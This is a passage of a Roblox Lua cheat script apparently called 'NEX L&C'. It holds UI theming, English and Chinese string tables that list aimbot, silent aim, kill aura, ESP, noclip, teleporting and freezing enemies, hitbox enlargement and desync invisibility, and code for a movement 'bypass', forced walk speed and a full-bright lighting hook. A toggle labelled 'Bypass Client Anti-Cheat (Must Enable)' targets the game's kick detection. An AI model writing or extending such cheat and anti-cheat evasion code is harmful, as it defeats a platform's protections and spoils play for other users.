    LabelBackgroundTransparency = 0.83,
    ElementBackground = Color3.fromHex("#2A2A2C"),
    ElementBackgroundTransparency = 0,
}

if customThemeEnabled then
    WindUI:AddTheme(CustomTheme)
    WindUI:SetTheme("Custom")
else
    WindUI:SetTheme("Indigo")
end

WindUI.TransparencyValue = 0.2
WindUI:SetTheme("Indigo")
WindUI:AddTheme({ Name = "Yellow", Accent = Color3.fromHex("#eab308"), Background = Color3.fromHex("#18181b") })
WindUI:AddTheme({ Name = "Purple", Accent = Color3.fromHex("#a855f7"), Background = Color3.fromHex("#18181b") })
WindUI:AddTheme({ Name = "Red", Accent = Color3.fromHex("#ef4444"), Background = Color3.fromHex("#18181b") })

Translations = {
    ["en"] = {
        WINDOW_TITLE = "NEX L&C",
        TAB_ANNOUNCEMENT = "Announcement",
        TAB_COMBAT = "Combat",
        TAB_AIMBOT = "Aimbot",
        TAB_ESP = "ESP",
        TAB_AUTO = "Auto / Class",
        TAB_OTHER = "Other",
        TAB_ENTERTAINMENT = "Entertainment",
        TAB_SETTINGS = "Settings",
        TAB_CHAT = "Chat",
        ANNOUNCE_WARNING_TITLE = "⚠️ Reselling prohibited ⚠️",
        ANNOUNCE_WARNING_CONTENT = "This script is completely free, reselling is strictly forbidden.",
        ANNOUNCE_FIX_TITLE = "🔧 Script repair notice 🔧",
        ANNOUNCE_FIX_CONTENT = "Script not working = being fixed, please try again later",
        BTN_BUG_FEEDBACK = "🐛 Bug feedback (10min cooldown)",
        BTN_SERVICE_FEEDBACK = "🛠️ Service feedback (10min cooldown)",
        FEEDBACK_COOLDOWN_TITLE = "Cooldown",
        FEEDBACK_COOLDOWN_CONTENT = "Please wait %d seconds before sending again",
        FEEDBACK_INPUT_TITLE = "Enter bug description or suggestion:",
        FEEDBACK_PLACEHOLDER = "e.g. Kill aura not working...",
        FEEDBACK_SUCCESS_TITLE = "Feedback sent",
        FEEDBACK_SUCCESS_CONTENT = "Sent to developer, thank you!",
        FEEDBACK_FAIL_TITLE = "Feedback failed",
        FEEDBACK_FAIL_CONTENT = "Network error or webhook unavailable",
        TOGGLE_MANUAL_HIT = "Manual Kill Aura",
        DESC_MANUAL_HIT = "Auto extra hits when you hit an enemy.",
        SLIDER_HIT_COUNT = "Hit Count",
        SLIDER_HIT_DELAY = "Hit Delay",
        SLIDER_MANUAL_RANGE = "Attack Range",
        SLIDER_MANUAL_FOV = "FOV Limit (degrees)",
        TOGGLE_KILL_AURA = "Kill Aura",
        DESC_KILL_AURA = "Auto-attack nearest enemy.",
        SLIDER_ATTACK_RANGE = "Attack Range",
        SLIDER_ATTACK_SPEED = "Attack Speed",
        TOGGLE_BREAK_BUILDINGS = "Break Buildings",
        TOGGLE_REPAIR_BUILDINGS = "Auto Repair Buildings",
        DESC_REPAIR_BUILDINGS = "Auto repair nearby buildings with hammer.",
        SLIDER_REPAIR_RANGE = "Repair Range",
        SLIDER_REPAIR_SPEED = "Repair Speed (seconds)",
        TOGGLE_NO_FALL = "No Fall Damage",
        TOGGLE_AIMBOT = "Aimbot",
        TOGGLE_AIM_HEAD = "Aim at Head",
        SLIDER_AIM_RANGE = "Aim Range (pixels)",
        SLIDER_AIM_SMOOTHNESS = "Smoothness",
        TOGGLE_SILENT_AIM = "Silent Aim",
        DESC_SILENT_AIM = "Bullets auto-hit enemies",
        TOGGLE_SILENT_FOV = "FOV Limit",
        DESC_SILENT_FOV = "Only hit enemies near crosshair (uses aim range)",
        TOGGLE_WALL_CHECK = "Wall Check",
        DESC_WALL_CHECK = "Check for walls before aiming",
        SECTION_RAGEBOT = "RageBot",
        TOGGLE_RAGEBOT = "Enable RageBot",
        SLIDER_RAGE_INTERVAL = "Shoot Interval (seconds)",
        BTN_RAGE_TARGET_PART = "Target Part: Head",
        DROPDOWN_RAGE_SPECIFIC = "Specific Target",
        DROPDOWN_RAGE_WHITELIST = "Whitelist",
        TOGGLE_ESP = "Enable ESP",
        TOGGLE_ESP_DOTS = "Show ESP Dots",
        TOGGLE_ESP_NAMES = "Show Names",
        TOGGLE_BODY_CENTER_TP = "Body Center TP",
        TOGGLE_AUTO_MARK = "Auto Mark (Spyglass)",
        BTN_OPEN_FLY_WINDOW = "Open Fly Window",
        TOGGLE_TELEPORT_TOOL = "Show Teleport UI",
        TOGGLE_UNDERGROUND_TOOL = "Underground Tool",
        TOGGLE_NOCLIP = "Noclip (Walk through walls)",
        TOGGLE_SPEED = "Coordinate Speed",
        DESC_SPEED = "Modify position directly for fast movement",
        SLIDER_SPEED = "Speed",
        TOGGLE_NO_SLOW = "No Slow",
        DESC_NO_SLOW = "Speed never drops below 16",
        TOGGLE_SPIN = "Spin",
        SLIDER_SPIN_SPEED = "Spin Speed",
        TOGGLE_PERF_MODE = "Performance Mode",
        BTN_LINMO_SCRIPT = "Linmo Jue Script",
        BTN_ANGRY_ROBOT = "Angry Robot (External)",
        TOGGLE_ULTRA_FOV = "Ultra FOV",
        DESC_ULTRA_FOV = "Modify camera field of view, max 120°",
        SLIDER_FOV_VALUE = "FOV Angle",
        SECTION_FAST_RELOAD = "Fast Reload",
        TOGGLE_AUTO_RELOAD = "Auto Reload",
        DESC_AUTO_RELOAD = "Automatically refill ammo every frame.",
        BTN_MANUAL_RELOAD = "Manual Reload",
        DESC_MANUAL_RELOAD = "Instantly refill current weapon ammo.",
        SECTION_CONFIG = "Config Management",
        BTN_SAVE_CONFIG = "Save Config",
        BTN_LOAD_CONFIG = "Load Config",
        DESC_CONFIG = "Save/Load all function settings",
        CONFIG_SAVE_TITLE = "Save Config",
        CONFIG_SAVE_PROMPT = "Enter config name:",
        CONFIG_SAVE_SUCCESS = "Config saved: ",
        CONFIG_SAVE_FAIL = "Save failed",
        CONFIG_LOAD_SUCCESS = "Config loaded: ",
        CONFIG_LOAD_FAIL = "Load failed",
        CONFIG_EMPTY_NAME = "Name cannot be empty",
        CONFIG_NO_FILE = "No config file found",
        CONFIG_CORRUPTED = "Config file corrupted",
        PERF_MODE_ENABLED = "Performance mode enabled",
        PERF_MODE_DISABLED = "Performance mode disabled",
        TELEPORT_TOOL_TITLE = "Teleport Tool",
        TELEPORT_APPROACH = "Approach Player",
        TELEPORT_FLY_HEAD = "Fly to Head",
        TELEPORT_HOTKEY = "Press F6 to teleport to mouse",
        TELEPORT_STOP = "Stopped",
        TELEPORT_NO_TARGET = "No available targets",
        TELEPORT_TARGET_DIED = "Target died, finding new target",
        TELEPORT_NEW_TARGET = "New target: ",
        TELEPORT_PAUSE = "Paused",
        TELEPORT_RESUME = "Resumed",
        UNDERGROUND_TITLE = "Underground",
        UNDERGROUND_ON = "Underground (On)",
        UNDERGROUND_OFF = "Underground (Off)",
        UNDERGROUND_ACTIVE = "Underground active",
        UNDERGROUND_INACTIVE = "Underground inactive",
        FLY_WINDOW_TITLE = "Fly Control",
        FLY_TOGGLE_ON = "On",
        FLY_TOGGLE_OFF = "Off",
        FLY_MODE_HOLD = "Mode: Hold",
        FLY_MODE_CLICK = "Mode: Click",
        FLY_HOVER_ON = "Hover: On",
        FLY_HOVER_OFF = "Hover: Off",
        FLY_BTN_UP = "Up",
        FLY_BTN_DOWN = "Down",
        FLY_BTN_FORWARD = "Forward",
        FLY_BTN_BACK = "Back",
        FLY_BTN_LEFT = "Left",
        FLY_BTN_RIGHT = "Right",
        BURN_TITLE = "Burn Buildings",
        BURN_TOGGLE_ON = "🔴 On",
        BURN_TOGGLE_OFF = "🔘 Off",
        BURN_RANGE = "Range: ",
        ESP_FRIEND_COLOR = "Friend",
        ESP_ENEMY_COLOR = "Enemy",
        ESP_TEAMMATE_COLOR = "Teammate",
        FEEDBACK_BUG = "Bug Feedback",
        FEEDBACK_SERVICE = "Service Feedback",
        FEEDBACK_SENT = "Feedback sent successfully",
        FEEDBACK_FAILED = "Feedback failed to send",
        KILL_AURA_RANGE = "Attack range",
        KILL_AURA_SPEED = "Attack speed",
        MANUAL_HIT_COUNT = "Hit count",
        MANUAL_HIT_DELAY = "Hit delay",
        AIMBOT_RANGE = "Aim range (pixels)",
        AIMBOT_SMOOTH = "Smoothness",
        RAGEBOT_INTERVAL = "Shoot interval (seconds)",
        RAGEBOT_SPECIFIC = "Specific target",
        RAGEBOT_WHITELIST = "Whitelist",
        RAGEBOT_TARGET_HEAD = "Target part: Head",
        RAGEBOT_TARGET_BODY = "Target part: Body",
        TOGGLE_ULTRA_FOV = "Ultra FOV",
        DESC_ULTRA_FOV = "Modify camera field of view, max 120°",
        SLIDER_FOV_VALUE = "FOV Angle",
        TOGGLE_BRING_ALL = "Bring All Enemies",
        DESC_BRING_ALL = "Teleport all enemies to your face and freeze them (toggle off to unfreeze)",
        TOGGLE_HOOK_BYPASS = "Hook Bypass",
        DESC_HOOK_BYPASS = "Enable 267 kick detection popup + Anti-AFK shake",
        TOGGLE_BURN = "Burn Buildings",
        DESC_BURN = "Set buildings on fire",
        SLIDER_BURN_RANGE = "Burn Range",
        BTN_TELEPORT_ENEMY = "Teleport Enemy to Front",
        BTN_OPEN_TELEPORT_UI = "Open Teleport UI",
        TELEPORT_STATUS = "Teleport status",
        TELEPORT_READY = "Ready",
        TELEPORT_TARGET = "Target: %s",
        BTN_COPY_AUTHOR = "Click to copy main author Bilibili UID",
        BTN_COPY_HELPER = "Click to copy main helper Bilibili UID",
        BTN_COPY_CO_AUTHOR = "Click to copy co-author Bilibili UID",
        BTN_COPY_GROUP = "Copy NEX group",
        BTN_COPY_HELPER2 = "Click to copy helper2 Bilibili UID",
        AUTHOR_UID = "UID:3493104875211423",
        HELPER_UID = "UID:3493283623864917",
        CO_AUTHOR_UID = "UID:3546714963184210",
        GROUP_ID = "1079540447",
        HELPER2_UID = "UID:1155497944",
        TAB_ANIMATION = "Animation",
        ANIM_TITLE = "🎬 Animation",
        TOGGLE_SHOW_TRACERS = "Show Tracers",
        DESC_SHOW_TRACERS = "Display bullet trails",
        TOGGLE_ESP2 = "ESP 2.0",
        DESC_ESP2 = "Show green box on self, colored boxes on others with rays, names and distances",
        TOGGLE_AUTO_PICKUP = "Auto Pickup Weapon",
        DESC_AUTO_PICKUP = "Automatically equip a melee weapon",
        TOGGLE_AUTO_FACE_ENEMY = "Auto Face Enemy",
        DESC_AUTO_FACE_ENEMY = "Face the nearest enemy within 10 studs",
        TOGGLE_UNLOCK_FOV = "Unlock FOV",
        DESC_UNLOCK_FOV = "Remove FOV limit (max 180°)",
        TOGGLE_NO_CLIP_CAM = "No Clip Camera",
        DESC_NO_CLIP_CAM = "Camera ignores walls and obstacles",
        TOGGLE_FAST_MELEE = "Fast Melee Swing",
        DESC_FAST_MELEE = "Increase melee weapon swing speed",
        TOGGLE_BIG_HEAD = "Big Head Hitbox",
        DESC_BIG_HEAD = "Enlarge enemy head hitbox",
        TOGGLE_DESYNC = "Desync Invisibility",
        DESC_DESYNC = "Become invisible and desync from server",
        TOGGLE_FAST_RELOAD2 = "Fast Reload (Animation)",
        DESC_FAST_RELOAD2 = "Speed up reload animation and reduce reload time",
        TOGGLE_ANTI_CHEAT_BYPASS = "Bypass Client Anti-Cheat (Must Enable)",
        DESC_ANTI_CHEAT_BYPASS = "Bypass 267 kick detection and other client checks",
        TOGGLE_SLING = "Sling Throw",
        DESC_SLING = "Disable enemy collisions and apply rapid rotation/velocity",
        TOGGLE_ZOMBIE = "Zombie Mode + Fog",
        DESC_ZOMBIE = "Turn yourself into a zombie with green fog and particles",
        TOGGLE_ENV_STORM = "Environmental Storm",
        DESC_ENV_STORM = "Enable snowstorm skybox, sea plane and falling snow",
        BTN_LOAD_CHAT = "Load Chat System",
        DESC_LOAD_CHAT = "Load the global chat system",
    },
    ["zh-cn"] = {
        WINDOW_TITLE = "NEX L&C",
        TAB_ANNOUNCEMENT = "公告",
        TAB_COMBAT = "战斗",
        TAB_AIMBOT = "自瞄",
        TAB_ESP = "ESP",
        TAB_AUTO = "自动 / 职业功能",
        TAB_OTHER = "其他",
        TAB_ENTERTAINMENT = "娱乐",
        TAB_SETTINGS = "设置",
        TAB_CHAT = "聊天",
        ANNOUNCE_WARNING_TITLE = "⚠️ 倒卖死全家 ⚠️",
        ANNOUNCE_WARNING_CONTENT = "本脚本完全免费，严禁倒卖。",
        ANNOUNCE_FIX_TITLE = "🔧 脚本修复提示 🔧",
        ANNOUNCE_FIX_CONTENT = "脚本无法使用 = 正在修复，请稍后再试",
        BTN_BUG_FEEDBACK = "🐛 Bug反馈（10分钟冷却）",
        BTN_SERVICE_FEEDBACK = "🛠️ 服务反馈（10分钟冷却）",
        FEEDBACK_COOLDOWN_TITLE = "反馈冷却",
        FEEDBACK_COOLDOWN_CONTENT = "请等待 %d 秒后再发送",
        FEEDBACK_INPUT_TITLE = "请输入 Bug 描述或建议：",
        FEEDBACK_PLACEHOLDER = "例如：杀戮光环不生效...",
        FEEDBACK_SUCCESS_TITLE = "反馈成功",
        FEEDBACK_SUCCESS_CONTENT = "已发送给开发者，感谢你的贡献！",
        FEEDBACK_FAIL_TITLE = "反馈失败",
        FEEDBACK_FAIL_CONTENT = "网络错误或 webhook 不可用",
        TOGGLE_MANUAL_HIT = "手动杀戮光环",
        DESC_MANUAL_HIT = "击中敌人时自动追加额外攻击。",
        SLIDER_HIT_COUNT = "连击次数",
        SLIDER_HIT_DELAY = "发包间隔",
        SLIDER_MANUAL_RANGE = "攻击距离",
        SLIDER_MANUAL_FOV = "视野限制（角度）",
        TOGGLE_KILL_AURA = "杀戮光环",
        DESC_KILL_AURA = "自动攻击最近敌人（支持空手）",
        SLIDER_ATTACK_RANGE = "攻击距离",
        SLIDER_ATTACK_SPEED = "攻击速度",
        TOGGLE_BREAK_BUILDINGS = "拆建筑",
        TOGGLE_REPAIR_BUILDINGS = "自动修建筑",
        DESC_REPAIR_BUILDINGS = "手持锤子自动修复附近建筑。",
        SLIDER_REPAIR_RANGE = "修复范围",
        SLIDER_REPAIR_SPEED = "修复间隔（秒）",
        TOGGLE_NO_FALL = "防摔死",
        TOGGLE_AIMBOT = "自瞄",
        TOGGLE_AIM_HEAD = "吸附头部",
        SLIDER_AIM_RANGE = "吸附范围（像素）",
        SLIDER_AIM_SMOOTHNESS = "平滑程度",
        TOGGLE_SILENT_AIM = "静默瞄准",
        DESC_SILENT_AIM = "子弹自动命中敌人",
        TOGGLE_SILENT_FOV = "视野限制",
        DESC_SILENT_FOV = "只对准星附近的敌人进行静默瞄准（使用吸附范围）",
        TOGGLE_WALL_CHECK = "墙体检测",
        DESC_WALL_CHECK = "检测墙壁遮挡，只瞄准可见敌人",
        SECTION_RAGEBOT = "RageBot",
        TOGGLE_RAGEBOT = "启用RageBot",
        SLIDER_RAGE_INTERVAL = "射击间隔（秒）",
        BTN_RAGE_TARGET_PART = "目标部位: 头部",
        DROPDOWN_RAGE_SPECIFIC = "指定目标",
        DROPDOWN_RAGE_WHITELIST = "白名单",
        TOGGLE_RAGE_WALL_CHECK = "墙体检测",
        TOGGLE_ESP = "开启ESP",
        TOGGLE_ESP_DOTS = "显示透视圆点",
        TOGGLE_ESP_NAMES = "显示名字",
        TOGGLE_BODY_CENTER_TP = "身体中心传送",
        TOGGLE_AUTO_MARK = "望远镜自动标记",
        BTN_OPEN_FLY_WINDOW = "打开飞天悬浮窗",
        TOGGLE_TELEPORT_TOOL = "显示传送UI",
        TOGGLE_UNDERGROUND_TOOL = "遁地工具",
        TOGGLE_NOCLIP = "穿墙（无碰撞）",
        TOGGLE_SPEED = "坐标加速",
        DESC_SPEED = "通过修改坐标实现快速移动",
        SLIDER_SPEED = "移动速度",
        TOGGLE_NO_SLOW = "无减速",
        DESC_NO_SLOW = "速度永远不会低于16",
        TOGGLE_SPIN = "旋转",
        SLIDER_SPIN_SPEED = "旋转速度",
        TOGGLE_PERF_MODE = "性能模式",
        BTN_LINMO_SCRIPT = "林墨玦脚本",
        BTN_ANGRY_ROBOT = "愤怒机器人（外部脚本）",
        TOGGLE_ULTRA_FOV = "超广角",
        DESC_ULTRA_FOV = "修改相机视野，最高120度",
        SLIDER_FOV_VALUE = "FOV角度",
        SECTION_FAST_RELOAD = "快速换弹",
        TOGGLE_AUTO_RELOAD = "自动换弹",
        DESC_AUTO_RELOAD = "每帧自动补充弹药。",
        BTN_MANUAL_RELOAD = "手动换弹",
        DESC_MANUAL_RELOAD = "立即补充当前武器弹药。",
        SECTION_CONFIG = "配置管理",
        BTN_SAVE_CONFIG = "保存配置",
        BTN_LOAD_CONFIG = "加载配置",
        DESC_CONFIG = "保存/加载所有功能设置",
        CONFIG_SAVE_TITLE = "保存配置",
        CONFIG_SAVE_PROMPT = "请输入配置名称：",
        CONFIG_SAVE_SUCCESS = "配置已保存：",
        CONFIG_SAVE_FAIL = "保存失败",
        CONFIG_LOAD_SUCCESS = "配置已加载：",
        CONFIG_LOAD_FAIL = "加载失败",
        CONFIG_EMPTY_NAME = "名称不能为空",
        CONFIG_NO_FILE = "未找到配置文件",
        CONFIG_CORRUPTED = "配置文件损坏",
        PERF_MODE_ENABLED = "性能模式已开启",
        PERF_MODE_DISABLED = "性能模式已关闭",
        TELEPORT_TOOL_TITLE = "传送工具",
        TELEPORT_APPROACH = "靠近玩家",
        TELEPORT_FLY_HEAD = "飞向头部",
        TELEPORT_HOTKEY = "按 F6 传送到鼠标位置",
        TELEPORT_STOP = "已停止",
        TELEPORT_NO_TARGET = "没有可用目标",
        TELEPORT_TARGET_DIED = "目标死亡，寻找新目标",
        TELEPORT_NEW_TARGET = "新目标：",
        TELEPORT_PAUSE = "已暂停",
        TELEPORT_RESUME = "已恢复",
        UNDERGROUND_TITLE = "遁地",
        UNDERGROUND_ON = "遁地 (开)",
        UNDERGROUND_OFF = "遁地 (关)",
        UNDERGROUND_ACTIVE = "遁地中",
        UNDERGROUND_INACTIVE = "未遁地",
        FLY_WINDOW_TITLE = "飞天控制",
        FLY_TOGGLE_ON = "开启",
        FLY_TOGGLE_OFF = "关闭",
        FLY_MODE_HOLD = "模式:按住",
        FLY_MODE_CLICK = "模式:点按",
        FLY_HOVER_ON = "悬停:开",
        FLY_HOVER_OFF = "悬停:关",
        FLY_BTN_UP = "上",
        FLY_BTN_DOWN = "下",
        FLY_BTN_FORWARD = "前",
        FLY_BTN_BACK = "后",
        FLY_BTN_LEFT = "左",
        FLY_BTN_RIGHT = "右",
        BURN_TITLE = "烧建筑",
        BURN_TOGGLE_ON = "🔴 开启",
        BURN_TOGGLE_OFF = "🔘 关闭",
        BURN_RANGE = "范围：",
        ESP_FRIEND_COLOR = "好友",
        ESP_ENEMY_COLOR = "敌人",
        ESP_TEAMMATE_COLOR = "队友",
        FEEDBACK_BUG = "Bug反馈",
        FEEDBACK_SERVICE = "服务反馈",
        FEEDBACK_SENT = "反馈发送成功",
        FEEDBACK_FAILED = "反馈发送失败",
        KILL_AURA_RANGE = "攻击距离",
        KILL_AURA_SPEED = "攻击速度",
        MANUAL_HIT_COUNT = "连击次数",
        MANUAL_HIT_DELAY = "发包间隔",
        AIMBOT_RANGE = "吸附范围（像素）",
        AIMBOT_SMOOTH = "平滑程度",
        RAGEBOT_INTERVAL = "射击间隔（秒）",
        RAGEBOT_SPECIFIC = "指定目标",
        RAGEBOT_WHITELIST = "白名单",
        RAGEBOT_TARGET_HEAD = "目标部位: 头部",
        RAGEBOT_TARGET_BODY = "目标部位: 身体",
        TOGGLE_RAGE_WALL_CHECK = "墙体检测",
        TOGGLE_ULTRA_FOV = "超广角",
        DESC_ULTRA_FOV = "修改相机视野，最高120度",
        SLIDER_FOV_VALUE = "FOV角度",
        TOGGLE_BRING_ALL = "传送所有敌人",
        DESC_BRING_ALL = "将所有敌人传送到自己面前并冻结（关闭后解冻）",
        TOGGLE_HOOK_BYPASS = "hook越级绕过",
        DESC_HOOK_BYPASS = "开启267踢检测弹窗 + 反AFK抖动",
        TOGGLE_BURN = "烧建筑",
        DESC_BURN = "点燃敌方建筑",
        SLIDER_BURN_RANGE = "烧建筑范围",
        BTN_TELEPORT_ENEMY = "传送敌人到面前",
        BTN_OPEN_TELEPORT_UI = "打开传送UI",
        TELEPORT_STATUS = "传送状态",
        TELEPORT_READY = "就绪",
        TELEPORT_TARGET = "目标: %s",
        BTN_COPY_AUTHOR = "点击复制主作者B站UID",
        BTN_COPY_HELPER = "点击复制最大帮助者B站UID",
        BTN_COPY_CO_AUTHOR = "点击复制副作者B站UID",
        BTN_COPY_GROUP = "复制NEX交流群",
        BTN_COPY_HELPER2 = "点击复制帮助者2 B站UID",
        AUTHOR_UID = "UID:3493104875211423",
        HELPER_UID = "UID:3493283623864917",
        CO_AUTHOR_UID = "UID:3546714963184210",
        GROUP_ID = "1079540447",
        HELPER2_UID = "UID:1155497944",
        TAB_ANIMATION = "动画",
        ANIM_TITLE = "🎬 动画",
        TOGGLE_SHOW_TRACERS = "显示弹道轨迹",
        DESC_SHOW_TRACERS = "显示子弹轨迹",
        TOGGLE_ESP2 = "ESP 2.0",
        DESC_ESP2 = "自身显示绿色方框，他人显示彩色方框、射线、名字和距离",
        TOGGLE_AUTO_PICKUP = "自动拿起武器",
        DESC_AUTO_PICKUP = "自动装备近战武器",
        TOGGLE_AUTO_FACE_ENEMY = "自动朝向敌人",
        DESC_AUTO_FACE_ENEMY = "朝向10距离内的最近敌人",
        TOGGLE_UNLOCK_FOV = "解除视角上限",
        DESC_UNLOCK_FOV = "移除FOV限制（最高180°）",
        TOGGLE_NO_CLIP_CAM = "视角不受掩体阻挡",
        DESC_NO_CLIP_CAM = "相机无视墙壁和障碍物",
        TOGGLE_FAST_MELEE = "快速挥刀",
        DESC_FAST_MELEE = "提高近战武器挥动速度",
        TOGGLE_BIG_HEAD = "大头Hitbox",
        DESC_BIG_HEAD = "增大敌人头部受击盒",
        TOGGLE_DESYNC = "Desync隐身",
        DESC_DESYNC = "使自己隐身并脱离服务器同步",
        TOGGLE_FAST_RELOAD2 = "快速换弹（动画加速）",
        DESC_FAST_RELOAD2 = "加速换弹动画并减少换弹时间",
        TOGGLE_ANTI_CHEAT_BYPASS = "绕过客户端反作弊(必开)",
        DESC_ANTI_CHEAT_BYPASS = "绕过267踢检测及其他客户端检测",
        TOGGLE_SLING = "甩飞",
        DESC_SLING = "禁用敌人碰撞并施加高速旋转/速度",
        TOGGLE_ZOMBIE = "僵尸模式 + 绿雾",
        DESC_ZOMBIE = "将自己变成僵尸，带有绿雾和粒子",
        TOGGLE_ENV_STORM = "环境风暴",
        DESC_ENV_STORM = "启用暴风雪天空盒、海面和降雪",
        TOGGLE_TELEPORT_RETAIN = "传送后保留位置",
        DESC_TELEPORT_RETAIN = "关闭后，停止传送时会回到原位",
        BTN_LOAD_CHAT = "加载聊天系统",
        DESC_LOAD_CHAT = "加载全局聊天系统",
    }
}

WindUI:Localization({ Enabled = true, Prefix = "loc:", DefaultLanguage = "zh-cn", Translations = Translations })

local windowConfig = {
    Title = "loc:WINDOW_TITLE",
    Icon = savedIcon,
    ToggleKey = Enum.KeyCode.LeftShift,
    Theme = customThemeEnabled and "Custom" or "Indigo",
    Size = UDim2.fromOffset(680, 720),
    Resizable = true,
    Transparent = true,
}
if customThemeEnabled then
    windowConfig.Background = savedBg
    windowConfig.BackgroundImageTransparency = 0.15
end
updateLoadingProgress("正在创建主窗口...", 60)
Window = WindUI:CreateWindow(windowConfig)
getgenv().NEX_LC_WINDOW = Window
updateLoadingProgress("主窗口创建完成", 70)

-- 自定义 N 图标覆盖 (使用素材ID: 114247283741336)
task.delay(0.8, function()
    pcall(function()
        local mainFrame = Window.MainFrame
        if not mainFrame then return end
        local titleBar = mainFrame:FindFirstChild("TitleBar")
        if not titleBar then
            for _, child in ipairs(mainFrame:GetChildren()) do
                if child:IsA("Frame") then
                    local hasText, hasImage = false, false
                    for _, sub in ipairs(child:GetChildren()) do
                        if sub:IsA("TextLabel") then hasText = true end
                        if sub:IsA("ImageLabel") then hasImage = true end
                    end
                    if hasText and hasImage then titleBar = child; break end
                end
            end
        end
        if not titleBar then return end

        local foundIcon = false
        for _, child in ipairs(titleBar:GetDescendants()) do
            if child:IsA("ImageLabel") then
                child.Image = savedIcon
                child.ImageColor3 = Color3.fromRGB(255, 255, 255)
                child.BackgroundTransparency = 1
                child.Size = UDim2.new(0, 22, 0, 22)
                foundIcon = true
            end
        end

        if not foundIcon then
            local titleLabel = nil
            for _, child in ipairs(titleBar:GetDescendants()) do
                if child:IsA("TextLabel") and child.Name:lower():find("title") then
                    titleLabel = child; break
                end
            end
            if not titleLabel then titleLabel = titleBar:FindFirstChildWhichIsA("TextLabel") end
            if titleLabel then
                local icon = Instance.new("ImageLabel")
                icon.Name = "CustomNIcon"
                icon.Size = UDim2.new(0, 22, 0, 22)
                icon.Position = UDim2.new(0, 10, 0.5, -11)
                icon.BackgroundTransparency = 1
                icon.Image = savedIcon
                icon.ImageColor3 = Color3.fromRGB(255, 255, 255)
                icon.Parent = titleBar
                titleLabel.Position = UDim2.new(0, 38, titleLabel.Position.Y.Scale, titleLabel.Position.Y.Offset)
            end
        end
    end)
end)
getgenv().NEX_LC_WINDOW = Window

Players = game:GetService("Players")
RunService = game:GetService("RunService")
ReplicatedStorage = game:GetService("ReplicatedStorage")
TeleportService = game:GetService("TeleportService")
TweenService = game:GetService("TweenService")
Workspace = game:GetService("Workspace")
CoreGui = game:GetService("CoreGui")
UserInputService = game:GetService("UserInputService")
HttpService = game:GetService("HttpService")
localPlayer = Players.LocalPlayer
Camera = workspace.CurrentCamera
Debris = game:GetService("Debris")
Lighting = game:GetService("Lighting")

local bypassConnection = nil
local function startBypass()
    if bypassConnection then return end
    bypassConnection = RunService.Heartbeat:Connect(function()
        local char = localPlayer.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then return end
        pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Climbing, true) end)
        pcall(function()
            if hum:GetState() ~= Enum.HumanoidStateType.Climbing then
                hum:ChangeState(Enum.HumanoidStateType.Climbing)
            end
        end)
        pcall(function()
            if hum.PlatformStand then
                hum.PlatformStand = false
            end
        end)
        pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Climbing, true) end)
    end)
end
local function stopBypass()
    if bypassConnection then
        bypassConnection:Disconnect()
        bypassConnection = nil
    end
    local char = localPlayer.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum and hum:GetState() == Enum.HumanoidStateType.Climbing then
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
        end
    end
end

local speedThresholdEnabled = false
local speedThresholdConn = nil
local originalWalkSpeed = 16

function updateSpeedThreshold()
    if speedThresholdEnabled then
        if originalWalkSpeed == nil then
            local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then originalWalkSpeed = hum.WalkSpeed end
        end
        if not speedThresholdConn then
            speedThresholdConn = RunService.Heartbeat:Connect(function()
                local char = localPlayer.Character
                if char then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if hum then
                        hum.WalkSpeed = 21.6
                    end
                end
            end)
        end
    else
        if speedThresholdConn then
            speedThresholdConn:Disconnect()
            speedThresholdConn = nil
        end
        if originalWalkSpeed then
            local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.WalkSpeed = originalWalkSpeed
            end
            originalWalkSpeed = nil
        end
    end
end

_G.FullBrightEnabled = false
_G.NormalLightingSettings = {}
_G.FullBrightExecuted = false

local function applyFullBright()
    if not _G.FullBrightEnabled then return end
    local lighting = game:GetService("Lighting")
    lighting.Brightness = 1
    lighting.ClockTime = 12
    lighting.FogEnd = 786543
    lighting.GlobalShadows = false
    lighting.Ambient = Color3.fromRGB(178, 178, 178)
end

local function restoreFullBright()
    if _G.NormalLightingSettings.Brightness ~= nil then
        local lighting = game:GetService("Lighting")
        lighting.Brightness = _G.NormalLightingSettings.Brightness
        lighting.ClockTime = _G.NormalLightingSettings.ClockTime
        lighting.FogEnd = _G.NormalLightingSettings.FogEnd
        lighting.GlobalShadows = _G.NormalLightingSettings.GlobalShadows
        lighting.Ambient = _G.NormalLightingSettings.Ambient
    end
end

local function initFullBrightHooks()
    if _G.FullBrightExecuted then return end
    _G.FullBrightExecuted = true
    local lighting = game:GetService("Lighting")
    _G.NormalLightingSettings.Brightness = lighting.Brightness
    _G.NormalLightingSettings.ClockTime = lighting.ClockTime
    _G.NormalLightingSettings.FogEnd = lighting.FogEnd
    _G.NormalLightingSettings.GlobalShadows = lighting.GlobalShadows
    _G.NormalLightingSettings.Ambient = lighting.Ambient

    lighting:GetPropertyChangedSignal("Brightness"):Connect(function()
        if _G.FullBrightEnabled and lighting.Brightness ~= 1 then
            lighting.Brightness = 1
        end
    end)
    lighting:GetPropertyChangedSignal("ClockTime"):Connect(function()
        if _G.FullBrightEnabled and lighting.ClockTime ~= 12 then
            lighting.ClockTime = 12
        end
    end)
    lighting:GetPropertyChangedSignal("FogEnd"):Connect(function()
        if _G.FullBrightEnabled and lighting.FogEnd ~= 786543 then
            lighting.FogEnd = 786543
        end
    end)
    lighting:GetPropertyChangedSignal("GlobalShadows"):Connect(function()
        if _G.FullBrightEnabled and lighting.GlobalShadows ~= false then
            lighting.GlobalShadows = false
        end
    end)
    lighting:GetPropertyChangedSignal("Ambient"):Connect(function()
        if _G.FullBrightEnabled and lighting.Ambient ~= Color3.fromRGB(178, 178, 178) then
            lighting.Ambient = Color3.fromRGB(178, 178, 178)
        end
    end)
end

local highlightEnabled = false

function updateHighlight()
    if highlightEnabled then
        if not _G.FullBrightExecuted then
            initFullBrightHooks()
        end
        _G.FullBrightEnabled = true
        applyFullBright()
        WindUI:Notify({ Title = "高亮", Content = "已开启", Duration = 2 })
    else
        _G.FullBrightEnabled = false
        restoreFullBright()
